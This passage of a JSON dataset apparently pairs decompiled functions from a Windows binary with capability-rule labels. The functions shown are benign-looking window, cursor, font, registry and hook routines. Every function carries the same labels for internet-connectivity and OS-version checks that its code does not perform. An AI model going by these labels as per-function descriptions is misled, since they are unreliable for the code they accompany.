        "decompiled_code": "\nvoid __fastcall fcn.0045a1dc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        cVar1 = fcn.0045a130(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.0045a130(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.0045a160(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0045a260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a260(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.00440d74(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00440d38();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.0045a230(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004039b8(),  cVar1 != '\\0' && (cVar1 = fcn.0045a260(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "0045a2dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a2dc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        cVar1 = fcn.0045a230(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.0045a230(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.0045a260(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0045a384": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045a384(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    unkbyte3 Var3;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x2c2) != 0) {\n        (**(in_EAX + 0x2c0))();\n    }\n    if ((((*(in_EAX + 0x248) == 0) || (*(*(in_EAX + 0x248) + 0x38) == 0)) || (uVar2 = fcn.00403a28(),  uVar2 == '\\0'))\n       && (uVar2 = fcn.0045a330(&stack0xfffffffc),  uVar2 == '\\0')) {\n        uVar1 = 0;\n        Var3 = 0;\n    }\n    else {\n        Var3 = uVar2 >> 8;\n        uVar1 = 1;\n    }\n    return CONCAT31(Var3, uVar1);\n}\n",
        "token_count": 234
    },
    "0045a400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a400(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x250) != 0) && (iVar1 = (****(arg_8h + 0x250))(*(arg_8h + 0x250), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.00422edc(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "0045a484": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a484(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x483e0c != NULL)) {\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0044407c(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x2e0) == '\\0') && (*(in_EAX + 0x2e8) == '\\0')) {\n                uVar2 = fcn.0044407c(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.0044407c(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.0044407c(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar3 = *(*(in_EAX + 0x2e0) * 4 + 0x483e90) | *(*(in_EAX + 0x2e8) * 4 + 0x483e98);\n                uVar2 = fcn.0044407c(*(in_EAX + 0x2ec), uVar3 & 0xffffff00 | *(in_EAX + 0x2e1), uVar3);\n                (**0x483e0c)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "0045a5ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a5ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x483e0c != 0)) &&\n       ((*(in_EAX + 0x2e0) != '\\0' || (*(in_EAX + 0x2e8) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0045aac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045aac0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    puVar2 = *0x4843d8;\n    (*0x4843d8)[1] = in_EAX;\n    *puVar2 = 0x45ae64;\n    puVar2 = *0x4843e8;\n    (*0x4843e8)[1] = in_EAX;\n    *puVar2 = 0x45ae70;\n    fcn.0045ae7c();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x4845b0)(0, 0, fcn.00457294, *(in_EAX + 0x58));\n    uVar3 = fcn.00425f64();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.00425f64();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.00425f64();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.0045b2cc();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x45b194;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x45b194;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x45b194;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 787
    },
    "0045ad90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ad90(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0045ae14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ae14(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041c688();\n    fcn.0041c688();\n    fcn.0045dd10();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x485b48 + 0x84) != 0)) {\n        fcn.00445634();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0045aed8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045aed8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puStack20;\n    \n    puStack20 = *(in_EAX + 0x5c);\n    while (puStack20 != NULL) {\n        iVar1 = puStack20[1];\n        if ((((-0x12 < iVar1) && (iVar1 < -0xb)) || (iVar1 == -0x15)) || (0 < iVar1)) {\n            puStack20 = puStack20[2];\n            sub.user32.dll_DestroyCursor();\n        }\n        puStack20 = *puStack20;\n        fcn.00402b44();\n    }\n    iVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar1 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0045af78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045af78(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x45b123;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.004037f0();\n        *(var_4h + 0x34) = uVar3;\n        fcn.004045c8();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.0045af78::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.00448de8();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x45b030;\n                    uStack656 = fcn.00409900(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x45b03b;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x45b0df;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x45b16c, 0, 0, &fcn.0045af78::var_214h, &fcn.0045af78::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.00404838();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.00404838();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x45b0e6);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x1d) = 0;\n        fcn.0041e8d4();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x45b12a;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 848
    },
    "0045b200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045b200(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puStack4;\n    \n    uVar1 = 0;\n    puStack4 = param_1;\n    if (param_2 != -1) {\n        for (puStack4 = *(in_EAX + 0x5c); (puStack4 != NULL && (param_2 != puStack4[1])); puStack4 = *puStack4) {\n        }\n        if (puStack4 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puStack4[2];\n        }\n    }\n    return CONCAT44(puStack4, uVar1);\n}\n",
        "token_count": 182
    },
    "0045b2cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045b2cc(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x485b48 != 0) {\n        var_1h._0_1_ = *(*0x485b48 + 0x88);\n    }\n    uStack420 = 0x45b411;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x485b48 != 0) {\n        fcn.0045d934();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.004262f4();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.004262f4();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.004263d8();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.004262f4();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.004262f4();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.004262f4();\n    }\n    fcn.00426138();\n    fcn.00426138();\n    *in_FS_OFFSET = puStack464;\n    if (*0x485b48 != 0) {\n        fcn.0045d934(0x45b418);\n    }\n    return;\n}\n",
        "token_count": 585
    },
    "0045b428": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b428(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.0045b448();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045b4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045b4b0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x22b) == '\\x02')) {\n        var_8h = in_EAX[0x10];\n        var_ch = in_EAX[0x11];\n        iVar3 = (***0x484484)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x84))(var_10h, iVar3);\n    if (*(in_EAX + 0x22b) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x45b5ec\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 992
    },
    "0045b660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045b660(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x22b) != '\\x01')))) {\n        fcn.0041c358();\n    }\n    iVar2 = fcn.0045ad88();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045ad74();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x22b) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.0041c4c8();\n                    cVar1 = fcn.0045b450();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.0041c54c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.0041c4c8();\n            fcn.0045b4b0(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "0045b7ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045b7ac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0045ad88();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0045ad74();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x22b) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 202
    },
    "0045b88c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b88c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x45b8ba;\n    var_4h = in_EAX;\n    fcn.0045b420();\n    uStack36 = 0x45b905;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.0045b88c::var_14h, 0);\n    fcn.0045b804();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.0045b428(0x45b90c);\n    return;\n}\n",
        "token_count": 316
    },
    "0045b920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b920(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0040461c();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 107
    },
    "0045b958": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b958(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x99) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0045b978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b978(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x485b48 != 0) {\n        uStack24 = 0x45b9a9;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.0045df3c();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0045b9cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b9cc(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x485b58 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x485b48 != 0) {\n            if (*(*0x485b48 + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0043c0c0();\n                if (iVar1 == 0) {\n                    fcn.0045dfb8();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0045ba28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ba28(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x485b60, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x485b48 != 0)) {\n        fcn.0045cf80();\n    }\n    return uVar1;\n}\n",
